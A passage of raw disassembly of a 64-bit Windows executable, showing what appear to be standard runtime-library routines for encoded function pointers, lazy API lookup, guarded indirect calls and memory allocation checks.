   140009c50:	0f 85 b0 00 00 00    	jne    0x140009d06
   140009c56:	ff 15 7c 64 00 00    	call   *0x647c(%rip)        # 0x1400100d8
   140009c5c:	83 f8 57             	cmp    $0x57,%eax
   140009c5f:	75 45                	jne    0x140009ca6
   140009c61:	8d 58 b0             	lea    -0x50(%rax),%ebx
   140009c64:	49 8b ce             	mov    %r14,%rcx
   140009c67:	44 8b c3             	mov    %ebx,%r8d
   140009c6a:	48 8d 15 b7 75 00 00 	lea    0x75b7(%rip),%rdx        # 0x140011228
   140009c71:	e8 7a c3 ff ff       	call   0x140005ff0
   140009c76:	85 c0                	test   %eax,%eax
   140009c78:	74 2c                	je     0x140009ca6
   140009c7a:	44 8b c3             	mov    %ebx,%r8d
   140009c7d:	48 8d 15 74 8d 00 00 	lea    0x8d74(%rip),%rdx        # 0x1400129f8
   140009c84:	49 8b ce             	mov    %r14,%rcx
   140009c87:	e8 64 c3 ff ff       	call   0x140005ff0
   140009c8c:	85 c0                	test   %eax,%eax
   140009c8e:	74 16                	je     0x140009ca6
   140009c90:	45 33 c0             	xor    %r8d,%r8d
   140009c93:	33 d2                	xor    %edx,%edx
   140009c95:	49 8b ce             	mov    %r14,%rcx
   140009c98:	ff 15 9a 64 00 00    	call   *0x649a(%rip)        # 0x140010138
   140009c9e:	48 8b d8             	mov    %rax,%rbx
   140009ca1:	48 85 c0             	test   %rax,%rax
   140009ca4:	75 60                	jne    0x140009d06
   140009ca6:	48 8b c7             	mov    %rdi,%rax
   140009ca9:	4c 8d 35 50 63 ff ff 	lea    -0x9cb0(%rip),%r14        # 0x140000000
   140009cb0:	49 87 84 f6 40 ba 01 	xchg   %rax,0x1ba40(%r14,%rsi,8)
   140009cb7:	00 
   140009cb8:	48 83 c5 04          	add    $0x4,%rbp
   140009cbc:	49 3b ec             	cmp    %r12,%rbp
   140009cbf:	0f 85 4d ff ff ff    	jne    0x140009c12
   140009cc5:	4c 8b 1d 34 03 01 00 	mov    0x10334(%rip),%r11        # 0x14001a000
   140009ccc:	41 8b c3             	mov    %r11d,%eax
   140009ccf:	b9 40 00 00 00       	mov    $0x40,%ecx
   140009cd4:	83 e0 3f             	and    $0x3f,%eax
   140009cd7:	2b c8                	sub    %eax,%ecx
   140009cd9:	48 d3 cf             	ror    %cl,%rdi
   140009cdc:	49 33 fb             	xor    %r11,%rdi
   140009cdf:	4b 87 bc fe f0 ba 01 	xchg   %rdi,0x1baf0(%r14,%r15,8)
   140009ce6:	00 
   140009ce7:	33 c0                	xor    %eax,%eax
   140009ce9:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140009cee:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140009cf3:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140009cf8:	48 83 c4 20          	add    $0x20,%rsp
   140009cfc:	41 5f                	pop    %r15
   140009cfe:	41 5e                	pop    %r14
   140009d00:	41 5d                	pop    %r13
   140009d02:	41 5c                	pop    %r12
   140009d04:	5f                   	pop    %rdi
   140009d05:	c3                   	ret
   140009d06:	48 8b c3             	mov    %rbx,%rax
   140009d09:	4c 8d 35 f0 62 ff ff 	lea    -0x9d10(%rip),%r14        # 0x140000000
   140009d10:	49 87 84 f6 40 ba 01 	xchg   %rax,0x1ba40(%r14,%rsi,8)
   140009d17:	00 
   140009d18:	48 85 c0             	test   %rax,%rax
   140009d1b:	74 09                	je     0x140009d26
   140009d1d:	48 8b cb             	mov    %rbx,%rcx
   140009d20:	ff 15 02 64 00 00    	call   *0x6402(%rip)        # 0x140010128
   140009d26:	49 8b d5             	mov    %r13,%rdx
   140009d29:	48 8b cb             	mov    %rbx,%rcx
   140009d2c:	ff 15 fe 63 00 00    	call   *0x63fe(%rip)        # 0x140010130
   140009d32:	48 85 c0             	test   %rax,%rax
   140009d35:	74 8e                	je     0x140009cc5
   140009d37:	4c 8b 05 c2 02 01 00 	mov    0x102c2(%rip),%r8        # 0x14001a000
   140009d3e:	ba 40 00 00 00       	mov    $0x40,%edx
   140009d43:	41 8b c8             	mov    %r8d,%ecx
   140009d46:	83 e1 3f             	and    $0x3f,%ecx
   140009d49:	2b d1                	sub    %ecx,%edx
   140009d4b:	8a ca                	mov    %dl,%cl
   140009d4d:	48 8b d0             	mov    %rax,%rdx
   140009d50:	48 d3 ca             	ror    %cl,%rdx
   140009d53:	49 33 d0             	xor    %r8,%rdx
   140009d56:	4b 87 94 fe f0 ba 01 	xchg   %rdx,0x1baf0(%r14,%r15,8)
   140009d5d:	00 
   140009d5e:	eb 89                	jmp    0x140009ce9
   140009d60:	40 53                	rex push %rbx
   140009d62:	48 83 ec 20          	sub    $0x20,%rsp
   140009d66:	48 8b d9             	mov    %rcx,%rbx
   140009d69:	4c 8d 0d 08 8d 00 00 	lea    0x8d08(%rip),%r9        # 0x140012a78
   140009d70:	b9 19 00 00 00       	mov    $0x19,%ecx
   140009d75:	4c 8d 05 f8 8c 00 00 	lea    0x8cf8(%rip),%r8        # 0x140012a74
   140009d7c:	48 8d 15 f5 8c 00 00 	lea    0x8cf5(%rip),%rdx        # 0x140012a78
   140009d83:	e8 1c fe ff ff       	call   0x140009ba4
   140009d88:	48 85 c0             	test   %rax,%rax
   140009d8b:	74 20                	je     0x140009dad
   140009d8d:	49 ba 70 c0 d1 34 da 	movabs $0xbdc017da34d1c070,%r10
   140009d94:	17 c0 bd 
   140009d97:	48 8b d3             	mov    %rbx,%rdx
   140009d9a:	48 c7 c1 fa ff ff ff 	mov    $0xfffffffffffffffa,%rcx
   140009da1:	48 83 c4 20          	add    $0x20,%rsp
   140009da5:	5b                   	pop    %rbx
   140009da6:	48 ff 25 13 65 00 00 	rex.W jmp *0x6513(%rip)        # 0x1400102c0
   140009dad:	b8 25 02 00 c0       	mov    $0xc0000225,%eax
   140009db2:	48 83 c4 20          	add    $0x20,%rsp
   140009db6:	5b                   	pop    %rbx
   140009db7:	c3                   	ret
   140009db8:	48 83 ec 28          	sub    $0x28,%rsp
   140009dbc:	4c 8d 0d 49 8c 00 00 	lea    0x8c49(%rip),%r9        # 0x140012a0c
   140009dc3:	33 c9                	xor    %ecx,%ecx
   140009dc5:	4c 8d 05 3c 8c 00 00 	lea    0x8c3c(%rip),%r8        # 0x140012a08
   140009dcc:	48 8d 15 3d 8c 00 00 	lea    0x8c3d(%rip),%rdx        # 0x140012a10
   140009dd3:	e8 cc fd ff ff       	call   0x140009ba4
   140009dd8:	48 85 c0             	test   %rax,%rax
   140009ddb:	74 15                	je     0x140009df2
   140009ddd:	49 ba 70 30 52 5e 47 	movabs $0xd30527475e523070,%r10
   140009de4:	27 05 d3 
   140009de7:	48 83 c4 28          	add    $0x28,%rsp
   140009deb:	48 ff 25 ce 64 00 00 	rex.W jmp *0x64ce(%rip)        # 0x1400102c0
   140009df2:	b8 01 00 00 00       	mov    $0x1,%eax
   140009df7:	48 83 c4 28          	add    $0x28,%rsp
   140009dfb:	c3                   	ret
   140009dfc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009e01:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140009e06:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140009e0b:	57                   	push   %rdi
   140009e0c:	48 83 ec 50          	sub    $0x50,%rsp
   140009e10:	41 8b d9             	mov    %r9d,%ebx
   140009e13:	49 8b f8             	mov    %r8,%rdi
   140009e16:	8b f2                	mov    %edx,%esi
   140009e18:	4c 8d 0d 09 8c 00 00 	lea    0x8c09(%rip),%r9        # 0x140012a28
   140009e1f:	48 8b e9             	mov    %rcx,%rbp
   140009e22:	4c 8d 05 f7 8b 00 00 	lea    0x8bf7(%rip),%r8        # 0x140012a20
   140009e29:	48 8d 15 f8 8b 00 00 	lea    0x8bf8(%rip),%rdx        # 0x140012a28
   140009e30:	b9 01 00 00 00       	mov    $0x1,%ecx
   140009e35:	e8 6a fd ff ff       	call   0x140009ba4
   140009e3a:	4c 8b d8             	mov    %rax,%r11
   140009e3d:	48 85 c0             	test   %rax,%rax
   140009e40:	74 5f                	je     0x140009ea1
   140009e42:	49 ba 70 08 55 7a f4 	movabs $0xab8817f47a550870,%r10
   140009e49:	17 88 ab 
   140009e4c:	48 8b 94 24 a0 00 00 	mov    0xa0(%rsp),%rdx
   140009e53:	00 
   140009e54:	44 8b cb             	mov    %ebx,%r9d
   140009e57:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
   140009e5e:	00 
   140009e5f:	4c 8b c7             	mov    %rdi,%r8
   140009e62:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   140009e69:	00 
   140009e6a:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   140009e6f:	8b d6                	mov    %esi,%edx
   140009e71:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   140009e76:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   140009e7d:	00 
   140009e7e:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140009e83:	8b 8c 24 88 00 00 00 	mov    0x88(%rsp),%ecx
   140009e8a:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   140009e8e:	48 8b cd             	mov    %rbp,%rcx
   140009e91:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140009e96:	49 8b c3             	mov    %r11,%rax
   140009e99:	ff 15 21 64 00 00    	call   *0x6421(%rip)        # 0x1400102c0
   140009e9f:	eb 32                	jmp    0x140009ed3
   140009ea1:	33 d2                	xor    %edx,%edx
   140009ea3:	48 8b cd             	mov    %rbp,%rcx
   140009ea6:	e8 b9 01 00 00       	call   0x14000a064
   140009eab:	8b c8                	mov    %eax,%ecx
   140009ead:	44 8b cb             	mov    %ebx,%r9d
   140009eb0:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
   140009eb7:	4c 8b c7             	mov    %rdi,%r8
   140009eba:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140009ebe:	8b d6                	mov    %esi,%edx
   140009ec0:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   140009ec7:	00 
   140009ec8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140009ecd:	ff 15 65 63 00 00    	call   *0x6365(%rip)        # 0x140010238
   140009ed3:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140009ed8:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140009edd:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140009ee2:	48 83 c4 50          	add    $0x50,%rsp
   140009ee6:	5f                   	pop    %rdi
   140009ee7:	c3                   	ret
   140009ee8:	48 ff 25 29 63 00 00 	rex.W jmp *0x6329(%rip)        # 0x140010218
   140009eef:	cc                   	int3
   140009ef0:	48 ff 25 39 63 00 00 	rex.W jmp *0x6339(%rip)        # 0x140010230
   140009ef7:	cc                   	int3
   140009ef8:	48 ff 25 21 63 00 00 	rex.W jmp *0x6321(%rip)        # 0x140010220
   140009eff:	cc                   	int3
   140009f00:	48 ff 25 21 63 00 00 	rex.W jmp *0x6321(%rip)        # 0x140010228
   140009f07:	cc                   	int3
   140009f08:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009f0d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140009f12:	57                   	push   %rdi
   140009f13:	48 83 ec 20          	sub    $0x20,%rsp
   140009f17:	41 8b f0             	mov    %r8d,%esi
   140009f1a:	4c 8d 0d 1f 8b 00 00 	lea    0x8b1f(%rip),%r9        # 0x140012a40
   140009f21:	8b da                	mov    %edx,%ebx
   140009f23:	4c 8d 05 0e 8b 00 00 	lea    0x8b0e(%rip),%r8        # 0x140012a38
   140009f2a:	48 8b f9             	mov    %rcx,%rdi
   140009f2d:	48 8d 15 64 73 00 00 	lea    0x7364(%rip),%rdx        # 0x140011298
   140009f34:	b9 0f 00 00 00       	mov    $0xf,%ecx
   140009f39:	e8 66 fc ff ff       	call   0x140009ba4
   140009f3e:	48 85 c0             	test   %rax,%rax
   140009f41:	74 1a                	je     0x140009f5d
   140009f43:	49 ba 70 da d2 32 50 	movabs $0x82a03e5032d2da70,%r10
   140009f4a:	3e a0 82 
   140009f4d:	44 8b c6             	mov    %esi,%r8d
   140009f50:	8b d3                	mov    %ebx,%edx
   140009f52:	48 8b cf             	mov    %rdi,%rcx
   140009f55:	ff 15 65 63 00 00    	call   *0x6365(%rip)        # 0x1400102c0
   140009f5b:	eb 0b                	jmp    0x140009f68
   140009f5d:	8b d3                	mov    %ebx,%edx
   140009f5f:	48 8b cf             	mov    %rdi,%rcx
   140009f62:	ff 15 98 61 00 00    	call   *0x6198(%rip)        # 0x140010100
   140009f68:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009f6d:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140009f72:	48 83 c4 20          	add    $0x20,%rsp
   140009f76:	5f                   	pop    %rdi
   140009f77:	c3                   	ret
   140009f78:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009f7d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140009f82:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140009f87:	57                   	push   %rdi
   140009f88:	48 83 ec 50          	sub    $0x50,%rsp
   140009f8c:	41 8b d9             	mov    %r9d,%ebx
   140009f8f:	49 8b f8             	mov    %r8,%rdi
   140009f92:	8b f2                	mov    %edx,%esi
   140009f94:	4c 8d 0d ad 8a 00 00 	lea    0x8aad(%rip),%r9        # 0x140012a48
   140009f9b:	48 8b e9             	mov    %rcx,%rbp
   140009f9e:	4c 8d 05 9b 8a 00 00 	lea    0x8a9b(%rip),%r8        # 0x140012a40
   140009fa5:	48 8d 15 9c 8a 00 00 	lea    0x8a9c(%rip),%rdx        # 0x140012a48
   140009fac:	b9 11 00 00 00       	mov    $0x11,%ecx
   140009fb1:	e8 ee fb ff ff       	call   0x140009ba4
   140009fb6:	4c 8b d8             	mov    %rax,%r11
   140009fb9:	48 85 c0             	test   %rax,%rax
   140009fbc:	74 5f                	je     0x14000a01d
   140009fbe:	49 ba 70 e2 57 50 62 	movabs $0xe3a11f625057e270,%r10
   140009fc5:	1f a1 e3 
   140009fc8:	48 8b 94 24 a0 00 00 	mov    0xa0(%rsp),%rdx
   140009fcf:	00 
   140009fd0:	44 8b cb             	mov    %ebx,%r9d
   140009fd3:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
   140009fda:	00 
   140009fdb:	4c 8b c7             	mov    %rdi,%r8
   140009fde:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   140009fe5:	00 
   140009fe6:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   140009feb:	8b d6                	mov    %esi,%edx
   140009fed:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   140009ff2:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   140009ff9:	00 
   140009ffa:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140009fff:	8b 8c 24 88 00 00 00 	mov    0x88(%rsp),%ecx
   14000a006:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   14000a00a:	48 8b cd             	mov    %rbp,%rcx
   14000a00d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000a012:	49 8b c3             	mov    %r11,%rax
   14000a015:	ff 15 a5 62 00 00    	call   *0x62a5(%rip)        # 0x1400102c0
   14000a01b:	eb 32                	jmp    0x14000a04f
   14000a01d:	33 d2                	xor    %edx,%edx
   14000a01f:	48 8b cd             	mov    %rbp,%rcx
   14000a022:	e8 3d 00 00 00       	call   0x14000a064
   14000a027:	8b c8                	mov    %eax,%ecx
   14000a029:	44 8b cb             	mov    %ebx,%r9d
   14000a02c:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
   14000a033:	4c 8b c7             	mov    %rdi,%r8
   14000a036:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000a03a:	8b d6                	mov    %esi,%edx
   14000a03c:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   14000a043:	00 
   14000a044:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000a049:	ff 15 f1 61 00 00    	call   *0x61f1(%rip)        # 0x140010240
   14000a04f:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000a054:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   14000a059:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   14000a05e:	48 83 c4 50          	add    $0x50,%rsp
   14000a062:	5f                   	pop    %rdi
   14000a063:	c3                   	ret
   14000a064:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a069:	57                   	push   %rdi
   14000a06a:	48 83 ec 20          	sub    $0x20,%rsp
   14000a06e:	8b fa                	mov    %edx,%edi
   14000a070:	4c 8d 0d e9 89 00 00 	lea    0x89e9(%rip),%r9        # 0x140012a60
   14000a077:	48 8b d9             	mov    %rcx,%rbx
   14000a07a:	48 8d 15 df 89 00 00 	lea    0x89df(%rip),%rdx        # 0x140012a60
   14000a081:	b9 13 00 00 00       	mov    $0x13,%ecx
   14000a086:	4c 8d 05 cb 89 00 00 	lea    0x89cb(%rip),%r8        # 0x140012a58
   14000a08d:	e8 12 fb ff ff       	call   0x140009ba4
   14000a092:	48 85 c0             	test   %rax,%rax
   14000a095:	74 17                	je     0x14000a0ae
   14000a097:	49 ba 70 32 d8 54 23 	movabs $0xeadd062354d83270,%r10
   14000a09e:	06 dd ea 
   14000a0a1:	8b d7                	mov    %edi,%edx
   14000a0a3:	48 8b cb             	mov    %rbx,%rcx
   14000a0a6:	ff 15 14 62 00 00    	call   *0x6214(%rip)        # 0x1400102c0
   14000a0ac:	eb 08                	jmp    0x14000a0b6
   14000a0ae:	48 8b cb             	mov    %rbx,%rcx
   14000a0b1:	e8 e6 1d 00 00       	call   0x14000be9c
   14000a0b6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a0bb:	48 83 c4 20          	add    $0x20,%rsp
   14000a0bf:	5f                   	pop    %rdi
   14000a0c0:	c3                   	ret
   14000a0c1:	cc                   	int3
   14000a0c2:	cc                   	int3
   14000a0c3:	cc                   	int3
   14000a0c4:	48 89 7c 24 08       	mov    %rdi,0x8(%rsp)
   14000a0c9:	48 8b 05 30 ff 00 00 	mov    0xff30(%rip),%rax        # 0x14001a000
   14000a0d0:	48 8d 3d 19 1a 01 00 	lea    0x11a19(%rip),%rdi        # 0x14001baf0
   14000a0d7:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   14000a0dc:	f3 48 ab             	rep stos %rax,(%rdi)
   14000a0df:	48 8b 7c 24 08       	mov    0x8(%rsp),%rdi
   14000a0e4:	b0 01                	mov    $0x1,%al
   14000a0e6:	c3                   	ret
   14000a0e7:	cc                   	int3
   14000a0e8:	40 53                	rex push %rbx
   14000a0ea:	48 83 ec 20          	sub    $0x20,%rsp
   14000a0ee:	84 c9                	test   %cl,%cl
   14000a0f0:	75 2f                	jne    0x14000a121
   14000a0f2:	48 8d 1d 47 19 01 00 	lea    0x11947(%rip),%rbx        # 0x14001ba40
   14000a0f9:	48 8b 0b             	mov    (%rbx),%rcx
   14000a0fc:	48 85 c9             	test   %rcx,%rcx
   14000a0ff:	74 10                	je     0x14000a111
   14000a101:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   14000a105:	74 06                	je     0x14000a10d
   14000a107:	ff 15 1b 60 00 00    	call   *0x601b(%rip)        # 0x140010128
   14000a10d:	48 83 23 00          	andq   $0x0,(%rbx)
   14000a111:	48 83 c3 08          	add    $0x8,%rbx
   14000a115:	48 8d 05 cc 19 01 00 	lea    0x119cc(%rip),%rax        # 0x14001bae8
   14000a11c:	48 3b d8             	cmp    %rax,%rbx
   14000a11f:	75 d8                	jne    0x14000a0f9
   14000a121:	b0 01                	mov    $0x1,%al
   14000a123:	48 83 c4 20          	add    $0x20,%rsp
   14000a127:	5b                   	pop    %rbx
   14000a128:	c3                   	ret
   14000a129:	cc                   	int3
   14000a12a:	cc                   	int3
   14000a12b:	cc                   	int3
   14000a12c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a131:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000a136:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000a13b:	57                   	push   %rdi
   14000a13c:	48 83 ec 20          	sub    $0x20,%rsp
   14000a140:	49 8b e8             	mov    %r8,%rbp
   14000a143:	48 8b da             	mov    %rdx,%rbx
   14000a146:	48 8b f1             	mov    %rcx,%rsi
   14000a149:	48 85 d2             	test   %rdx,%rdx
   14000a14c:	74 1d                	je     0x14000a16b
   14000a14e:	33 d2                	xor    %edx,%edx
   14000a150:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   14000a154:	48 f7 f3             	div    %rbx
   14000a157:	49 3b c0             	cmp    %r8,%rax
   14000a15a:	73 0f                	jae    0x14000a16b
   14000a15c:	e8 53 ca ff ff       	call   0x140006bb4
   14000a161:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   14000a167:	33 c0                	xor    %eax,%eax
   14000a169:	eb 41                	jmp    0x14000a1ac
   14000a16b:	48 85 f6             	test   %rsi,%rsi
   14000a16e:	74 0a                	je     0x14000a17a
   14000a170:	e8 cb 1d 00 00       	call   0x14000bf40
   14000a175:	48 8b f8             	mov    %rax,%rdi
   14000a178:	eb 02                	jmp    0x14000a17c
   14000a17a:	33 ff                	xor    %edi,%edi
   14000a17c:	48 0f af dd          	imul   %rbp,%rbx
   14000a180:	48 8b ce             	mov    %rsi,%rcx
   14000a183:	48 8b d3             	mov    %rbx,%rdx
   14000a186:	e8 f1 1d 00 00       	call   0x14000bf7c
   14000a18b:	48 8b f0             	mov    %rax,%rsi
   14000a18e:	48 85 c0             	test   %rax,%rax
   14000a191:	74 16                	je     0x14000a1a9
   14000a193:	48 3b fb             	cmp    %rbx,%rdi
   14000a196:	73 11                	jae    0x14000a1a9
   14000a198:	48 2b df             	sub    %rdi,%rbx
   14000a19b:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   14000a19f:	4c 8b c3             	mov    %rbx,%r8
   14000a1a2:	33 d2                	xor    %edx,%edx
   14000a1a4:	e8 c7 4d 00 00       	call   0x14000ef70
   14000a1a9:	48 8b c6             	mov    %rsi,%rax
   14000a1ac:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a1b1:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000a1b6:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000a1bb:	48 83 c4 20          	add    $0x20,%rsp
   14000a1bf:	5f                   	pop    %rdi
   14000a1c0:	c3                   	ret
   14000a1c1:	cc                   	int3
   14000a1c2:	cc                   	int3
   14000a1c3:	cc                   	int3
   14000a1c4:	48 83 ec 28          	sub    $0x28,%rsp
   14000a1c8:	ff 15 7a 60 00 00    	call   *0x607a(%rip)        # 0x140010248
   14000a1ce:	48 85 c0             	test   %rax,%rax
   14000a1d1:	48 89 05 18 1a 01 00 	mov    %rax,0x11a18(%rip)        # 0x14001bbf0
   14000a1d8:	0f 95 c0             	setne  %al
   14000a1db:	48 83 c4 28          	add    $0x28,%rsp
   14000a1df:	c3                   	ret
   14000a1e0:	48 83 25 08 1a 01 00 	andq   $0x0,0x11a08(%rip)        # 0x14001bbf0
   14000a1e7:	00 
   14000a1e8:	b0 01                	mov    $0x1,%al
   14000a1ea:	c3                   	ret
   14000a1eb:	cc                   	int3
   14000a1ec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a1f1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000a1f6:	57                   	push   %rdi
   14000a1f7:	48 83 ec 20          	sub    $0x20,%rsp
   14000a1fb:	48 8b f2             	mov    %rdx,%rsi
   14000a1fe:	48 8b f9             	mov    %rcx,%rdi
   14000a201:	48 3b ca             	cmp    %rdx,%rcx
   14000a204:	74 68                	je     0x14000a26e
   14000a206:	48 8b d9             	mov    %rcx,%rbx
   14000a209:	48 8b 03             	mov    (%rbx),%rax
   14000a20c:	48 85 c0             	test   %rax,%rax
   14000a20f:	74 14                	je     0x14000a225
   14000a211:	49 ba 70 a2 5c 5c c4 	movabs $0xdf949ec45c5ca270,%r10
   14000a218:	9e 94 df 
   14000a21b:	ff 15 9f 60 00 00    	call   *0x609f(%rip)        # 0x1400102c0
   14000a221:	84 c0                	test   %al,%al
   14000a223:	74 09                	je     0x14000a22e
   14000a225:	48 83 c3 10          	add    $0x10,%rbx
   14000a229:	48 3b de             	cmp    %rsi,%rbx
   14000a22c:	75 db                	jne    0x14000a209
   14000a22e:	48 3b de             	cmp    %rsi,%rbx
   14000a231:	74 3b                	je     0x14000a26e
   14000a233:	48 3b df             	cmp    %rdi,%rbx
   14000a236:	74 32                	je     0x14000a26a
   14000a238:	48 83 c3 f8          	add    $0xfffffffffffffff8,%rbx
   14000a23c:	48 83 7b f8 00       	cmpq   $0x0,-0x8(%rbx)
   14000a241:	74 1a                	je     0x14000a25d
   14000a243:	48 8b 03             	mov    (%rbx),%rax
   14000a246:	48 85 c0             	test   %rax,%rax
   14000a249:	74 12                	je     0x14000a25d
   14000a24b:	49 ba 70 3b 59 3e 75 	movabs $0x9799a6753e593b70,%r10
   14000a252:	a6 99 97 
   14000a255:	33 c9                	xor    %ecx,%ecx
   14000a257:	ff 15 63 60 00 00    	call   *0x6063(%rip)        # 0x1400102c0
   14000a25d:	48 83 eb 10          	sub    $0x10,%rbx
   14000a261:	48 8d 43 08          	lea    0x8(%rbx),%rax
   14000a265:	48 3b c7             	cmp    %rdi,%rax
   14000a268:	75 d2                	jne    0x14000a23c
   14000a26a:	32 c0                	xor    %al,%al
   14000a26c:	eb 02                	jmp    0x14000a270
   14000a26e:	b0 01                	mov    $0x1,%al
   14000a270:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a275:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000a27a:	48 83 c4 20          	add    $0x20,%rsp
   14000a27e:	5f                   	pop    %rdi
   14000a27f:	c3                   	ret
   14000a280:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a285:	57                   	push   %rdi
   14000a286:	48 83 ec 20          	sub    $0x20,%rsp
   14000a28a:	48 8b da             	mov    %rdx,%rbx
   14000a28d:	48 8b f9             	mov    %rcx,%rdi
   14000a290:	48 3b ca             	cmp    %rdx,%rcx
   14000a293:	74 24                	je     0x14000a2b9
   14000a295:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   14000a299:	48 85 c0             	test   %rax,%rax
   14000a29c:	74 12                	je     0x14000a2b0
   14000a29e:	49 ba 70 3b 59 3e 75 	movabs $0x9799a6753e593b70,%r10
   14000a2a5:	a6 99 97 
   14000a2a8:	33 c9                	xor    %ecx,%ecx
   14000a2aa:	ff 15 10 60 00 00    	call   *0x6010(%rip)        # 0x1400102c0
   14000a2b0:	48 83 eb 10          	sub    $0x10,%rbx
   14000a2b4:	48 3b df             	cmp    %rdi,%rbx
   14000a2b7:	75 dc                	jne    0x14000a295
   14000a2b9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a2be:	b0 01                	mov    $0x1,%al
   14000a2c0:	48 83 c4 20          	add    $0x20,%rsp
   14000a2c4:	5f                   	pop    %rdi
   14000a2c5:	c3                   	ret
   14000a2c6:	cc                   	int3
   14000a2c7:	cc                   	int3
   14000a2c8:	48 89 0d 29 19 01 00 	mov    %rcx,0x11929(%rip)        # 0x14001bbf8
   14000a2cf:	c3                   	ret
   14000a2d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a2d5:	57                   	push   %rdi
   14000a2d6:	48 83 ec 20          	sub    $0x20,%rsp
   14000a2da:	48 8b f9             	mov    %rcx,%rdi
   14000a2dd:	e8 2e 00 00 00       	call   0x14000a310
   14000a2e2:	33 db                	xor    %ebx,%ebx
   14000a2e4:	48 85 c0             	test   %rax,%rax
   14000a2e7:	74 1a                	je     0x14000a303
   14000a2e9:	49 ba 70 20 d3 1c df 	movabs $0xd1ed0fdf1cd32070,%r10
   14000a2f0:	0f ed d1 
   14000a2f3:	48 8b cf             	mov    %rdi,%rcx
   14000a2f6:	ff 15 c4 5f 00 00    	call   *0x5fc4(%rip)        # 0x1400102c0
   14000a2fc:	85 c0                	test   %eax,%eax
   14000a2fe:	0f 95 c3             	setne  %bl
   14000a301:	8b c3                	mov    %ebx,%eax
   14000a303:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a308:	48 83 c4 20          	add    $0x20,%rsp
   14000a30c:	5f                   	pop    %rdi
   14000a30d:	c3                   	ret
   14000a30e:	cc                   	int3
   14000a30f:	cc                   	int3
   14000a310:	40 53                	rex push %rbx
   14000a312:	48 83 ec 20          	sub    $0x20,%rsp
   14000a316:	33 c9                	xor    %ecx,%ecx
   14000a318:	e8 4f e9 ff ff       	call   0x140008c6c
   14000a31d:	90                   	nop
   14000a31e:	48 8b 05 db fc 00 00 	mov    0xfcdb(%rip),%rax        # 0x14001a000
   14000a325:	8b c8                	mov    %eax,%ecx
   14000a327:	83 e1 3f             	and    $0x3f,%ecx
   14000a32a:	48 8b 1d c7 18 01 00 	mov    0x118c7(%rip),%rbx        # 0x14001bbf8
   14000a331:	48 33 d8             	xor    %rax,%rbx
   14000a334:	48 d3 cb             	ror    %cl,%rbx
   14000a337:	33 c9                	xor    %ecx,%ecx
   14000a339:	e8 82 e9 ff ff       	call   0x140008cc0
   14000a33e:	48 8b c3             	mov    %rbx,%rax
   14000a341:	48 83 c4 20          	add    $0x20,%rsp
   14000a345:	5b                   	pop    %rbx
   14000a346:	c3                   	ret
